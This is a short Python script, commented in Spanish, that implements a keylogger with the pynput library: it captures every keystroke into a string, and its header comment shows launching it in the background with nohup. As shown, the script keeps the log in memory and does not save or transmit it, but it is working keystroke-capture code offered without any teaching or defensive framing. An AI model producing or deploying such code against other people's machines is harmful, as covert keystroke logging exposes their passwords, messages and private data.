#nohup python key_logger.py &

import pynput

# Creamos una clase para manejar las teclas pulsadas
class KeyLogger:
    def __init__(self):
        self.log = ""

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.log = self.log + current_key

# Creamos una instancia de la clase KeyLogger
key_logger = KeyLogger()

# Creamos una función para iniciar el registro de teclas pulsadas
def start_logging():
    with pynput.keyboard.Listener(on_press=key_logger.process_key_press) as listener:
        listener.join()

# Iniciamos el registro de teclas pulsadas en segundo plano
start_logging()
